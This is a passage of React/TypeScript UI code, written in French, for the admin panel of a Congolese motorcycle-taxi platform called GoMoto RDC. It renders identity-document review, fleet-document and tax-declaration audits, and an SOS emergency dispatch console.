                            {u.role === "driver" ? <Bike className="w-5 h-5 text-amber-600" /> : <Building className="w-5 h-5 text-blue-600" />}
                          </div>
                          <div>
                            <h4 className="font-bold text-slate-805 text-xs flex items-center gap-2">
                              <span>{u.firstName} {u.lastName}</span>
                              <span className={`px-2 py-0.5 rounded text-[8px] uppercase tracking-wider font-bold ${
                                u.role === "driver" ? "bg-amber-100 text-amber-800 border border-amber-200" : "bg-blue-100 text-blue-805 border border-blue-200"
                              }`}>
                                {u.role === "driver" ? "Motard / Chauffeur" : "Propriétaire de Flotte"}
                              </span>
                            </h4>
                            <p className="text-[10px] text-slate-450 mt-0.5 font-mono">Enrôlé le {u.registrationDate || "Récemment"} • Contact : {u.phone}</p>
                          </div>
                        </div>

                        <div className="text-right">
                          <span className="bg-amber-50 text-amber-805 border border-amber-205 px-2.5 py-1 rounded-md text-[9px] font-bold inline-flex items-center gap-1.5 shadow-sm uppercase font-mono">
                            <Clock className="w-3" />
                            <span>Pièce En Attente (Pending)</span>
                          </span>
                        </div>
                      </div>

                      {/* Meta info columns */}
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4.5 text-xs text-left">
                        <div className="space-y-1 text-left">
                          <span className="text-[10px] font-bold text-slate-400 uppercase font-mono">Détails du Citoyen</span>
                          <p className="text-slate-850 font-medium text-left">Email : <span className="font-mono text-slate-600">{u.email || "Non renseigné"}</span></p>
                          <p className="text-slate-850 font-medium text-left">Adresse physique : <span className="text-slate-600">{u.address.avenue}, C/{u.address.commune}, {u.address.city}</span></p>
                          <p className="text-slate-850 font-medium text-left">Province : <span className="font-bold text-blue-700">{u.address.province}</span></p>
                        </div>

                        <div className="space-y-1 text-left">
                          <span className="text-[10px] font-bold text-slate-400 uppercase font-mono">Pièce Légale de transport</span>
                          <p className="text-slate-855 font-medium text-left">Type de Document : <span className="font-bold text-slate-800">{u.documentType === "carte_identite_nationale" ? "Carte d'Électeur / ID d'État" : u.documentType === "permis_de_conduire" ? "Permis de Conduire Congolais" : u.documentType === "passeport" ? "Passeport RDC" : "Autre document d'État"}</span></p>
                          <p className="text-slate-855 font-medium text-left">Numéro de Pièce : <span className="font-bold font-mono text-xs text-indigo-750">{u.documentNumber || "C-4458-990"}</span></p>
                          {u.role === "driver" && (
                            <p className="text-slate-855 font-medium text-[11px] bg-amber-50 border border-amber-100 p-1.5 rounded-lg text-amber-800 mt-1.5 text-left">
                              <b>Moto :</b> {u.vehicleModel || "Honda CG 125"} • <b className="font-mono">{u.vehiclePlate || "C-KIN-4005"}</b>
                            </p>
                          )}
                        </div>

                        {/* Document visually simulated high fidelity container */}
                        <div className="bg-slate-50 border border-slate-205 rounded-2xl p-3 flex flex-col justify-between items-stretch">
                          <span className="text-[10px] font-bold text-slate-450 uppercase text-center block mb-2 font-mono">Visualisation administrative</span>
                          
                          <div className="border border-indigo-200 bg-indigo-50/20 rounded-xl p-3 text-[10px] relative overflow-hidden space-y-1.5 shadow-sm text-left">
                            <div className="absolute right-2 top-2 h-7 w-7 rounded-full border border-indigo-400/30 flex items-center justify-center text-[7px] text-indigo-650 font-black rotate-12 scale-90">
                              MIN/SEC
                            </div>
                            
                            <div className="flex items-center gap-1">
                              <span className="text-[8px] uppercase tracking-wider font-extrabold text-indigo-900 leading-tight">RÉPUBLIQUE DÉMOCRATIQUE DU CONGO</span>
                            </div>
                            <div className="border-t border-indigo-150 my-1"></div>
                            
                            <div>
                              <span className="text-[7px] text-slate-400 block font-mono">NOM DE CITOYEN:</span>
                              <span className="font-bold text-slate-800 font-mono uppercase text-xs">{u.lastName} {u.firstName}</span>
                            </div>
                            <div className="flex justify-between items-center text-xs text-left">
                              <div>
                                <span className="text-[7px] text-slate-400 block font-mono">NUMÉRO D'ENRÔLEMENT:</span>
                                <span className="font-bold text-indigo-900 font-mono text-[9px]">{u.documentNumber || "ID-906-8841-KIN"}</span>
                              </div>
                              <div className="text-right">
                                <span className="text-[7px] text-slate-400 block font-mono">PROVINCE:</span>
                                <span className="font-bold text-slate-805 font-mono text-[9px]">{u.address.province}</span>
                              </div>
                            </div>
                          </div>

                          <p className="text-[8px] text-slate-405 text-center mt-2 italic font-mono">Aperçu vectoriel d'enrôlement de transport régulier</p>
                        </div>
                      </div>

                      {/* Operational Actions */}
                      <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200 flex flex-col md:flex-row items-stretch justify-between gap-4 text-left">
                        <div className="flex-1">
                          <label className="block text-[10px] font-bold text-slate-550 uppercase mb-1 text-left">Notes administratives d'audit (optionnel)</label>
                          <input
                            type="text"
                            id={docNotesKey}
                            placeholder="Ex: Document valide et lisible, signature approuvée..."
                            className="w-full bg-white border border-slate-205 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-blue-600"
                          />
                        </div>

                        <div className="flex items-center gap-3 shrink-0">
                          <button
                            type="button"
                            onClick={() => setSelectedUserDocs(u)}
                            className="bg-indigo-50 hover:bg-indigo-100 border border-indigo-200 text-indigo-700 font-bold py-2 px-3.5 rounded-xl text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer shadow-sm"
                            title="Ouvrir le grand scanner d'identification biométrique d'État"
                          >
                            <Eye className="w-4 h-4 text-indigo-700" />
                            <span>Loupe & Scanner</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => {
                              const noteInput = document.getElementById(docNotesKey) as HTMLInputElement;
                              const notes = noteInput ? noteInput.value : "";
                              onUpdateUserStatus(u.id, "rejected");
                              alert(`Dossier de ${u.firstName} ${u.lastName} a été rejeté. Notes d'audit : "${notes}"`);
                            }}
                            className="bg-red-50 hover:bg-red-100 border border-red-200 text-red-650 font-bold py-2 px-3.5 rounded-xl text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer shadow-sm"
                          >
                            <X className="w-4 h-4 text-red-650" />
                            <span>Rejeter Pièce</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => {
                              const noteInput = document.getElementById(docNotesKey) as HTMLInputElement;
                              const notes = noteInput ? noteInput.value : "";
                              onUpdateUserStatus(u.id, "approved");
                              alert(`Félicitations ! Le profil de ${u.firstName} ${u.lastName} est certifié conforme par le greffe d'État GoMoto. Notes: "${notes}"`);
                            }}
                            className="bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2 px-4.5 rounded-xl text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer shadow-sm border border-emerald-500"
                          >
                            <Check className="w-4 h-4 text-white" />
                            <span>Approuver & Certifier</span>
                          </button>
                        </div>
                      </div>
                    </div>
                  );
                })
              ) : (
                <div className="bg-white border border-slate-200 p-8.5 rounded-3xl text-center space-y-2">
                  <div className="h-12 w-12 bg-emerald-50 text-emerald-600 rounded-full flex items-center justify-center mx-auto text-xl font-bold shadow-inner border border-emerald-100">
                    ✓
                  </div>
                  <h4 className="text-xs font-bold text-slate-850">Aucun dossier en attente (File vide)</h4>
                  <p className="text-[10.5px] text-slate-500 max-w-sm mx-auto leading-relaxed">
                    Tous les citoyens, motards et propriétaires de flotte ont été examinés et certifiés par la Direction d'Audit de GoMoto RDC.
                  </p>
                </div>
              )
            )}

            {/* View 2: Owner Fleet Documents (Carte Rose, Assurances, Vignette) */}
            {docAuditingSubTab === "owner_fleets" && (
              <div className="space-y-4">
                <div className="text-left bg-blue-50/50 p-4 border border-blue-100 rounded-2xl">
                  <span className="font-extrabold text-[11px] text-indigo-900 block uppercase font-mono">⚖️ Fardes Administratives d'Actifs de Flottes :</span>
                  <p className="text-[10px] text-slate-500 mt-0.5 leading-relaxed font-sans">
                    Les propriétaires de flotte doivent téléverser séparément s'ils ont des cartes roses de moto, contrats d'exploitation municipale, ou assurances SONAS pour valider légalement leur d'affiliation d'État. Examinez et certifiez chaque sous-pièce ci-dessous.
                  </p>
                </div>

                {getAllOwnerFleetDocs().length > 0 ? (
                  getAllOwnerFleetDocs().map((row) => (
                    <div key={row.owner.id} className="bg-white border border-slate-200 rounded-3xl p-5 space-y-4 shadow-sm text-left">
                      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center border-b border-slate-100 pb-3 gap-2">
                        <div className="flex items-center gap-2.5">
                          <div className="h-9 w-9 rounded-xl bg-indigo-50 border border-indigo-100 flex items-center justify-center text-indigo-700">
                            <Building className="w-5 h-5 text-indigo-700" />
                          </div>
                          <div>
                            <h4 className="font-extrabold text-xs text-slate-850">{row.owner.firstName} {row.owner.lastName}</h4>
                            <p className="text-[10px] text-slate-400 mt-0.5">Propriétaire de Flotte • Contact: <span className="font-mono font-bold text-slate-650">{row.owner.phone}</span></p>
                          </div>
                        </div>
                        <span className="bg-indigo-100/50 border border-indigo-200 text-indigo-800 text-[9px] font-black px-2.5 py-1 rounded-lg uppercase tracking-wider font-mono">
                          {row.docs.length} Pièces Déposées
                        </span>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        {row.docs.map((doc: any) => (
                          <div key={doc.id} className="bg-slate-50 border border-slate-150 rounded-2xl p-4.5 flex flex-col md:flex-row gap-4 items-start md:items-center">
                            <img referrerPolicy="no-referrer" src={doc.photoUrl} alt={doc.typeName} className="w-16 h-16 rounded-xl object-cover border border-slate-250 bg-white shadow-sm shrink-0" />
                            <div className="flex-1 space-y-1.5 text-left min-w-0">
                              <span className="text-[8.5px] font-extrabold uppercase tracking-widest text-slate-450 font-mono block">
                                {doc.type.replace("_", " ")}
                              </span>
                              <h5 className="font-extrabold text-[11px] text-slate-800 truncate" title={doc.typeName}>{doc.typeName}</h5>
                              <p className="text-[10px] font-mono text-slate-600 font-bold">N° : <span className="text-blue-700">{doc.docNumber}</span></p>
                              
                              <div className="flex items-center gap-3 text-[10px] text-slate-500 font-medium">
                                <span>Émis le: <span className="font-bold">{doc.issueDate}</span></span>
                                <span>Expire: <span className={`font-bold ${new Date(doc.expiryDate) < new Date() ? "text-red-500" : "text-emerald-600"}`}>{doc.expiryDate}</span></span>
                              </div>

                              <div className="flex justify-between items-center pt-2.5">
                                <div>
                                  {doc.status === "approved" ? (
                                    <span className="bg-emerald-100 text-emerald-800 border border-emerald-250 px-2 py-0.5 rounded-md text-[8.5px] font-black uppercase tracking-wider font-mono">✓ Approuvé</span>
                                  ) : doc.status === "rejected" ? (
                                    <span className="bg-red-100 text-red-800 border border-red-250 px-2 py-0.5 rounded-md text-[8.5px] font-black uppercase tracking-wider font-mono">❌ Rejeté</span>
                                  ) : (
                                    <span className="bg-amber-100 text-amber-800 border border-amber-250 px-2 py-0.5 rounded-md text-[8.5px] font-black uppercase tracking-wider font-mono animate-pulse">⌛ Audit Requis</span>
                                  )}
                                </div>
                                <div className="flex gap-1">
                                  <button
                                    type="button"
                                    onClick={() => handleReviewOwnerFleetDoc(row.owner.id, doc.id, "rejected")}
                                    className="bg-red-50 hover:bg-rose-100 border border-red-200 text-red-650 font-extrabold p-1.5 rounded-lg text-[9.5px]"
                                    title="Désapprouver ce document"
                                  >
                                    Rejeter
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() => handleReviewOwnerFleetDoc(row.owner.id, doc.id, "approved")}
                                    className="bg-emerald-600 hover:bg-emerald-700 text-white font-extrabold py-1 px-2.5 rounded-lg text-[9.5px]"
                                    title="Valider la conformité d'exploitation"
                                  >
                                    Approuver
                                  </button>
                                </div>
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  ))
                ) : (
                  <div className="bg-slate-50 border border-slate-200 p-8.5 rounded-3xl text-center">
                    <p className="text-[11px] text-slate-500 italic">Aucun propriétaire n'a téléversé de document de flotte pour l'instant.</p>
                  </div>
                )}
              </div>
            )}

            {/* View 3: Double Enrollments Oversight */}
            {docAuditingSubTab === "cross_enrollments" && (
              <div className="space-y-4">
                <div className="text-left bg-emerald-50/50 p-4 border border-emerald-100 rounded-2xl">
                  <span className="font-extrabold text-[11px] text-emerald-800 block uppercase font-mono">🛡️ Registre de Co-Régulation Propriétaire-Motard :</span>
                  <p className="text-[10px] text-slate-500 mt-0.5 leading-relaxed font-sans">
                    L'enrôlement croisé exige qu'un propriétaire légal et son motard de voirie soient explicitement liés au Greffe central pour assigner la responsabilité légale civile. Visualisez ou forcez la liaison bi-partie d'État.
                  </p>
                </div>

                <div className="bg-white border border-slate-200 rounded-3xl overflow-hidden shadow-sm text-left">
                  <table className="w-full text-left border-collapse text-xs">
                    <thead>
                      <tr className="bg-slate-900 text-white uppercase text-[8px] tracking-widest font-mono">
                        <th className="p-3.5 border-b border-slate-200">Propriétaire & Code</th>
                        <th className="p-3.5 border-b border-slate-200">Chauffeur Désigné</th>
                        <th className="p-3.5 border-b border-slate-200 text-center">Statut d'Audit RDC</th>
                        <th className="p-3.5 border-b border-slate-200 text-right">Actions de Sureté</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-100">
                      {getActiveDoubleEnrollings().map((rec, idx) => (
                        <tr key={idx} className="hover:bg-slate-50/80 transition-colors">
                          <td className="p-3.5">
                            <div>
                              <span className="font-extrabold text-slate-800 block text-xs">{rec.owner.firstName} {rec.owner.lastName}</span>
                              <span className="text-[9.5px] font-mono text-indigo-700 font-bold tracking-wider">{rec.code}</span>
                            </div>
                          </td>
                          <td className="p-3.5">
                            <div>
                              <span className="font-bold text-slate-700 block">{rec.driverName}</span>
                              <span className="text-[10px] text-slate-450 block">Moto: <span className="font-bold text-slate-600">{rec.owner.vehicleModel || "Honda CG"}</span></span>
                            </div>
                          </td>
                          <td className="p-3.5 text-center">
                            {rec.status === "confirmed" ? (
                              <span className="bg-emerald-100 text-emerald-800 border border-emerald-200 px-2 py-0.5 rounded-md font-mono font-black text-[8px] uppercase inline-block">✓ Conforme d'État</span>
                            ) : (
                              <span className="bg-amber-100 text-amber-800 border border-amber-200 px-2 py-0.5 rounded-md font-mono font-black text-[8px] uppercase inline-block animate-pulse">En Attente Pilote</span>
                            )}
                          </td>
                          <td className="p-3.5 text-right">
                            {rec.status !== "confirmed" && (
                              <button
                                type="button"
                                onClick={() => handleForceValidateEnrollment(rec.owner.id, rec.driverName)}
                                className="bg-indigo-600 hover:bg-indigo-700 text-white font-extrabold py-1.5 px-3 rounded-lg text-[9.5px] transition-all cursor-pointer shadow-sm border border-indigo-500"
                              >
                                Forcer la Validation d'État
                              </button>
                            )}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}

          {/* Split section line for Fiscalité & Déclarations */}
          <div className="border-t border-slate-200/80 pt-6 mt-6 text-left">
            <h3 className="text-xs font-black text-slate-800 uppercase tracking-widest flex items-center gap-2">
              <Building className="w-4 h-4 text-indigo-700" />
              <span>Arbitrage & Contrôle Fiscal ({submittedTaxDocs.length})</span>
            </h3>
            <p className="text-[10.5px] text-slate-550 mt-0.5 font-sans leading-normal">
              Examinez les déclarations de revenus journalières et fiches annuelles de taxes transmises par les citoyens (motards et propriétaires).
            </p>
          </div>

            {/* List of submitted tax documents */}
            {submittedTaxDocs.length === 0 ? (
              <div className="bg-slate-50 border border-slate-200/60 p-8.5 rounded-3xl text-center space-y-1.5">
                <div className="h-9 w-9 bg-slate-100 text-slate-400 rounded-full flex items-center justify-center mx-auto text-sm font-bold border border-slate-200">
                  ⌛
                </div>
                <h4 className="text-xs font-extrabold text-slate-800 font-sans">Aucun dossier fiscal en attente</h4>
                <p className="text-[10.5px] text-slate-500 max-w-sm mx-auto leading-normal font-sans">
                  Aucun citoyen (motard ou investisseur) n'a soumis de télédéclaration d'impôts d'exercice fiscal pour le moment.
                </p>
              </div>
            ) : (
              <div className="grid grid-cols-1 gap-5 text-left">
                {submittedTaxDocs.map((doc) => {
                  const docKey = `tax-note-${doc.id}`;
                  return (
                    <div key={doc.id} className="bg-white border border-slate-205 rounded-3xl p-5 shadow-sm space-y-4">
                      
                      {/* Banner header */}
                      <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-3 border-b border-slate-105">
                        <div className="flex items-center gap-3">
                          <div className="h-9 w-9 rounded-xl bg-indigo-50 border border-indigo-100 flex justify-center items-center text-indigo-600 font-black text-[10px]">
                            TAX
                          </div>
                          <div>
                            <h4 className="font-extrabold text-slate-800 text-xs flex items-center gap-2">
                              <span>{doc.userName}</span>
                              <span className={`px-2 py-0.5 rounded text-[8px] uppercase tracking-wider font-extrabold ${
                                doc.userRole === "driver" ? "bg-amber-100 text-amber-800 border border-amber-200" : "bg-blue-100 text-blue-800 border border-blue-200"
                              }`}>
                                {doc.userRole === "driver" ? "Chauffeur / Motard" : "Propriétaire Fleet"}
                              </span>
                            </h4>
                            <p className="text-[9.5px] text-slate-500 mt-0.5 font-sans">
                              Période : <span className="font-bold text-slate-705">{doc.period ?? doc.details?.period ?? ""}</span> • Soumis le {doc.submittedAt}
                            </p>
                          </div>
                        </div>

                        <div>
                          {doc.status === "pending" && (
                            <span className="bg-blue-50 text-blue-700 border border-blue-100 px-2 py-0.5 rounded-full text-[8.5px] font-black uppercase inline-flex items-center gap-1 font-sans animate-pulse">
                              ⏳ En attente de certification
                            </span>
                          )}
                          {doc.status === "approved" && (
                            <span className="bg-emerald-50 text-emerald-750 border border-emerald-100 px-2 py-0.5 rounded-full text-[8.5px] font-black uppercase inline-flex items-center gap-1 font-sans">
                              ✓ Certification Accordée
                            </span>
                          )}
                          {doc.status === "rejected" && (
                            <span className="bg-red-50 text-red-750 border border-red-100 px-2 py-0.5 rounded-full text-[8.5px] font-black uppercase inline-flex items-center gap-1 font-sans">
                              ✕ Déclinaison administrative
                            </span>
                          )}
                        </div>
                      </div>

                      {/* Content values */}
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-sans">
                        <div className="bg-slate-50/50 p-3 rounded-xl border border-slate-100 space-y-1.5 text-left">
                          <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest block font-mono">Déclarations de Chiffre d'Affaires</span>
                          <div className="flex justify-between items-center text-[11px]">
                            <span className="text-slate-500 font-sans">Formulaire fiscal :</span>
                            <span className="font-extrabold text-slate-800 font-sans">{doc.docType === "daily_revenue" ? "Fiche de Journée" : "Déclaration Annuelle d'Impôts"}</span>
                          </div>
                          <div className="flex justify-between items-center text-[11px] pt-1 pt-1 border-t border-slate-100/40">
                            <span className="text-slate-500 font-sans">Revenus d'audit (CDF) :</span>
                            <span className="font-black text-emerald-600 font-mono">{(doc.totalCDF ?? doc.details?.totalCDF ?? 0).toLocaleString()} CDF</span>
                          </div>
                          <div className="flex justify-between items-center text-[11px]">
                            <span className="text-slate-500 font-sans">Équivalent devises (USD) :</span>
                            <span className="font-black text-yellow-600 font-mono">${(doc.totalUSD ?? doc.details?.totalUSD ?? 0).toFixed(2)} USD</span>
                          </div>
                        </div>

                        <div className="bg-slate-50/50 p-3 rounded-xl border border-slate-100 space-y-1.5 text-left text-[11px]">
                          <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest block font-mono">Adresses de Certification</span>
                          <p className="text-slate-650"><b>ID Enregistrement :</b> <span className="font-mono text-[9px] bg-slate-205 px-1.5 py-0.5 rounded text-slate-800">{doc.id}</span></p>
                          <p className="text-slate-650"><b>Siège Social RDC :</b> <span className="font-semibold text-slate-700">{doc.headquartersAddress ?? doc.details?.headquartersAddress ?? "GoMoto Siège National, Kinshasa"}</span></p>
                          <p className="text-slate-655"><b>Adresse Chauffeur :</b> <span className="font-mono font-bold text-indigo-900 bg-indigo-50 px-1 py-0.2 rounded">{doc.confidentialUserAddress ?? (doc.userRole === "driver" ? doc.details?.confidentialDriverAddress : doc.details?.confidentialOwnerAddress) ?? "Non-déclarant"}</span></p>
                        </div>
                      </div>

                      {/* Notes & validations */}
                      {doc.status === "pending" ? (
                        <div className="bg-slate-50 p-3 rounded-2xl border border-slate-200/80 flex flex-col md:flex-row items-stretch justify-between gap-4 text-left">
                          <div className="flex-1">
                            <input
                              type="text"
                              id={docKey}
                              placeholder="Faites part de vos annotations d'audit fiscal (ex: Déclaration admissible, conforme...)"
                              className="w-full bg-white border border-slate-205 rounded-xl px-3 py-2 text-xs text-slate-850 outline-none focus:border-blue-600 focus:ring-1 focus:ring-blue-100"
                            />
                          </div>

                          <div className="flex items-center gap-3 shrink-0">
                            <button
                              type="button"
                              onClick={() => {
                                const el = document.getElementById(docKey) as HTMLInputElement;
                                const val = el ? el.value : "";
                                if (onReviewTaxDoc) {
                                  onReviewTaxDoc(doc.id, "rejected", val);
                                } else {
                                  alert("Mécanisme d'arbitrage fiscal indisponible.");
                                }
                              }}
                              className="bg-red-50 hover:bg-red-100 border border-red-200 text-red-650 font-extrabold py-1.5 px-3 rounded-xl text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer shadow-sm font-sans"
                            >
                              <X className="w-3.5 h-3.5" />
                              <span>Rejeter sous réserve</span>
                            </button>

                            <button
                              type="button"
                              onClick={() => {
                                const el = document.getElementById(docKey) as HTMLInputElement;
                                const val = el ? el.value : "Déclaration admissible & certifiée par la commission d'audit.";
                                if (onReviewTaxDoc) {
                                  onReviewTaxDoc(doc.id, "approved", val);
                                } else {
                                  alert("Mécanisme d'arbitrage fiscal indisponible.");
                                }
                              }}
                              className="bg-emerald-600 hover:bg-emerald-700 text-white font-extrabold py-1.5 px-3.5 rounded-xl text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer shadow-sm border border-emerald-500 font-sans"
                            >
                              <Check className="w-3.5 h-3.5" />
                              <span>Acquitter & Certifier</span>
                            </button>
                          </div>
                        </div>
                      ) : (
                        <div className="p-3 bg-slate-50 rounded-xl border border-slate-100 text-[10.5px] text-slate-500 text-left font-sans italic">
                          <b>Verdict de l'Administration :</b> {doc.adminNotes || "Admissible sans aucune decharge fiscale."}
                        </div>
                      )}

                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ================= ADMIN TAB 4: REAL-TIME GOMOTO SOS EMERGENCY COMMAND CENTER ================= */}
      {activeSubTab === "emergencies" && (
        <div className="space-y-6 text-left">
          {/* Header instructions block */}
          <div className="bg-gradient-to-r from-red-650 to-red-800 p-6 rounded-3xl text-white shadow-xl flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div className="space-y-1">
              <span className="bg-white/20 text-white font-mono font-black text-[9px] px-2 py-0.5 rounded-full tracking-widest uppercase">
                Directives d'Intervention Spéciales
              </span>
              <h3 className="text-sm md:text-base font-black tracking-tight flex items-center gap-2">
                <ShieldAlert className="w-5.5 h-5.5 text-white animate-bounce animate-[bounce_1s_infinite]" />
                <span>Centre National de Dispatching Routier & SOS GoMoto RDC</span>
              </h3>
              <p className="text-xs text-red-100 max-w-xl font-sans leading-relaxed">
                Supervisez les alertes géolocalisées émises par les motards et les passagers en situation d'urgence. En cas d'appel Panique actif, le centre GoMoto transmet la position immédiatement aux patrouilles de la PNC congolaise.
              </p>
            </div>
            
            <div className="bg-white/10 border border-white/20 px-4 py-3 rounded-2xl shrink-0 text-center md:text-right">
              <span className="text-[10px] text-red-200 block uppercase tracking-wider font-mono">Délai régional cible</span>
              <span className="text-xl font-black font-mono text-yellow-300">⏱️ &lt; 3 mins</span>
            </div>
          </div>

          {/* Quick Metrics of Distress */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 font-sans">
            <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-sm text-left">
              <span className="text-[9px] font-mono text-slate-400 uppercase block">Total Signaux Enregistrés</span>
              <span className="text-2xl font-black text-slate-800 font-mono mt-1 block">{sosAlerts.length} Dossiers</span>
              <span className="text-[10px] text-slate-500 font-sans block mt-1">Gérés depuis le 1er Janvier 2026</span>
            </div>

            <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-sm text-left relative overflow-hidden">
              <span className="text-[9px] font-mono text-slate-400 uppercase block">Alertes Actives Non Clôturées</span>
              <span className="text-2xl font-black text-red-650 font-mono mt-1 block flex items-center gap-1.5">
                <span>{sosAlerts.filter(a => a.status === "active").length} En Cours</span>
                {sosAlerts.filter(a => a.status === "active").length > 0 && (
                  <span className="h-3 w-3 rounded-full bg-red-600 animate-ping"></span>
                )}
              </span>
              <span className="text-[10px] text-slate-500 font-sans block mt-1">Nécessite priorisation maximale</span>
            </div>

            <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-sm text-left">
              <span className="text-[9px] font-mono text-slate-400 uppercase block">Performance de Dispatch</span>
              <span className="text-2xl font-black text-emerald-600 font-mono mt-1 block">99.4% Conforme</span>
              <span className="text-[10px] text-slate-500 font-sans block mt-1">Conformément aux directives de l'autorité</span>
            </div>
          </div>

          {/* SATELLITE GPS CO-ORDINATES RADAR MAP VISUALIZER */}
          <div className="bg-slate-950 text-white rounded-3xl p-5 border border-slate-800 space-y-4">
            <div className="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-3">
              <div className="space-y-0.5 text-left font-sans">
                <span className="bg-red-950 text-red-400 font-mono font-bold text-[8px] px-2 py-0.5 rounded tracking-wide border border-red-900/40 uppercase">
                  📡 TÉLÉMÉTRIE D'URGENCE INTERACTIVE
                </span>
                <h4 className="text-xs font-black text-slate-100 uppercase tracking-wide flex items-center gap-1.5 mt-1">
                  <span>Cartographie Satellite de RDC • Kinshasa Grid</span>
                </h4>
              </div>
              <div className="flex items-center gap-2 font-sans">
                <span className="h-2 w-2 rounded-full bg-red-500 animate-ping"></span>
                <span className="text-[10px] text-slate-400 font-mono">Radar GPS actif • 26 satellites de surveillance</span>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
              {/* Left Column: Interactive Map Grid SVG */}
              <div className="lg:col-span-2 bg-[#050B14] rounded-2xl border border-[#1E293B] h-[320px] relative overflow-hidden flex items-center justify-center">
                {(() => {
                  let defaultLat = -4.3224;
                  let defaultLng = 15.3070;
                  
                  if (focusedSOSId) {
                    const activeAlert = sosAlerts.find((a: any) => a.id === focusedSOSId);
                    if (activeAlert) {
                      defaultLat = activeAlert.latitude || defaultLat;
                      defaultLng = activeAlert.longitude || defaultLng;
                    }
                  }

                  return <MapDisplay lat={defaultLat} lng={defaultLng} />;
                })()}

                <div className="absolute top-2 left-2 bg-black/60 md:backdrop-blur-sm pointer-events-none border border-slate-800 px-2 py-1 rounded text-[7.5px] font-mono text-slate-400 z-10">
                  COORDS FOCUS : {focusedSOSId ? "TRIG." : "RECHERCHE..."}
                </div>
              </div>

              {/* Right Column: Mini Intervention Console Terminal */}
              <div className="bg-slate-900 rounded-2xl border border-slate-800 p-4 flex flex-col justify-between h-[320px] text-left">
                {focusedSOSId ? (() => {
                  const focusedAlert = sosAlerts.find(a => a.id === focusedSOSId);
                  if (!focusedAlert) return <p className="text-slate-500 text-[10px] font-sans">Sélectionnez un signal sur la carte pour émettre un dispatch.</p>;
                  
                  const isBrigadeDispatched = dispatchedBrigades[focusedAlert.id];

                  return (
                    <div className="flex-grow flex flex-col justify-between h-full space-y-3 font-sans">
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-[9px] text-red-500 font-extrabold uppercase font-mono tracking-widest block">FICHE CANAL DESPATCH</span>
                          <span className="bg-red-950/80 text-red-400 border border-red-900 px-2 py-0.5 rounded text-[8.5px] font-mono uppercase font-bold">
                            {focusedAlert.id}
                          </span>
                        </div>

                        <div className="text-xs space-y-1 bg-black/40 p-2.5 rounded-xl border border-slate-800/40 text-left">
                          <p className="text-white font-extrabold text-xs">{focusedAlert.userName}</p>
                          <p className="text-[10px] text-slate-450">Détresse : <b className="text-red-400 uppercase italic font-sans">{focusedAlert.reason}</b></p>
                          <p className="text-[9.5px] text-slate-500 font-mono">Tél : {focusedAlert.userPhone}</p>
                          <p className="text-[9px] text-slate-500 font-mono">Vecteur GPS: {focusedAlert.latitude.toFixed(5)}, {focusedAlert.longitude.toFixed(5)}</p>
                        </div>

                        {/* VoIP Live Micro intercom panel */}
                        <div id="voip-live-panel" className="bg-black/80 rounded-xl p-2 border border-slate-800 text-[9px] font-mono space-y-1">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-1">
                            <span className="text-emerald-400 font-extrabold flex items-center gap-1">
                              <span className={`h-1 w-1 rounded-full bg-emerald-400 ${sosIntercomActive ? "animate-pulse" : ""}`}></span>
                              INTERCOM VoIP RDC
                            </span>
                            <span className="text-slate-550 text-[8px]">{sosIntercomActive ? "DIRECT" : "MUTÉ"}</span>
                          </div>
                          
                          {sosIntercomActive ? (
                            <div className="space-y-0.5 text-[8px] text-slate-350 max-h-[50px] overflow-y-auto font-mono scroller-hidden">
                              {sosIntercomLog.map((log, i) => (
                                <p key={i}>{log}</p>
                              ))}
                            </div>
                          ) : (
                            <p className="text-slate-500 italic text-[8px] py-1 text-center font-sans">Aucune liaison d'intercom audio ouverte.</p>
                          )}

                          <button
                            type="button"
                            onClick={() => handleToggleSOSIntercom(focusedAlert.userName)}
                            className={`w-full font-bold py-1 px-2 rounded mt-1.5 text-[8.5px] cursor-pointer text-center flex items-center justify-center gap-1 ${
                              sosIntercomActive 
                                ? "bg-red-650 hover:bg-red-700 text-white" 
                                : "bg-emerald-700 hover:bg-emerald-650 text-white"
                            }`}
                          >
                            🎤 {sosIntercomActive ? "Muter Intercom" : "Ouvrir Intercom"}
                          </button>
                        </div>
                      </div>

                      {/* Dispatch Trigger Controls */}
                      <div className="space-y-1.5 border-t border-slate-800 pt-2 font-sans text-left">
                        <span className="text-[8.5px] text-slate-450 font-bold block uppercase">Escorte de Sécurité de Proximité :</span>
                        
                        {isBrigadeDispatched ? (
                          <div className="p-1 px-2 bg-indigo-950/60 rounded-lg border border-indigo-900 text-[8.5px] font-mono font-bold text-indigo-300 animate-pulse text-center">
                            {isBrigadeDispatched}
                          </div>
                        ) : (
                          <div className="grid grid-cols-2 gap-1.5">
                            <button
                              type="button"
                              onClick={() => handleDispatchBrigade(focusedAlert.id, "gomoto_sec")}
